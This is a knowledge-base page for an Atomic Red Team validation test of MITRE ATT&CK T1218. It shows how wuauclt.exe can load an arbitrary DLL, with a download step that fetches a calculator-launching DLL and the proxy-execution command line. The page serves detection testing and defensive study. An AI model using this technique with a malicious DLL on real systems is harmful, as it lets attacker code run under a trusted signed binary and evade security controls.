---
atomic_guid: "49fbd548-49e9-4bb7-94a6-3769613912b8"
title: "Load Arbitrary DLL via Wuauclt (Windows Update Client)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218"
attack_technique_name: "Signed Binary Proxy Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "49fbd548-49e9-4bb7-94a6-3769613912b8"
  - "Load Arbitrary DLL via Wuauclt (Windows Update Client)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Load Arbitrary DLL via Wuauclt (Windows Update Client)

This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. 
See https://dtm.uk/wuauclt/

## Metadata

- Atomic GUID: 49fbd548-49e9-4bb7-94a6-3769613912b8
- Technique: T1218: Signed Binary Proxy Execution
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1218/T1218.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Input Arguments

### arbitrary_dll

- description: Path of DLL to be loaded
- type: string
- default: PathToAtomicsFolder\T1218\bin\calc.dll

## Dependencies

DLL to load must exist on disk as specified location (#{arbitrary_dll})

### Prerequisite Check

```text
if (test-path "#{arbitrary_dll}"){exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory (split-path "#{arbitrary_dll}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true" -OutFile "#{arbitrary_dll}"
```

## Executor

- name: command_prompt

### Command

```commandprompt
wuauclt.exe /UpdateDeploymentProvider "#{arbitrary_dll}" /RunHandlerComServer
```

### Cleanup

```commandprompt
taskkill /f /im calculator.exe > nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml)
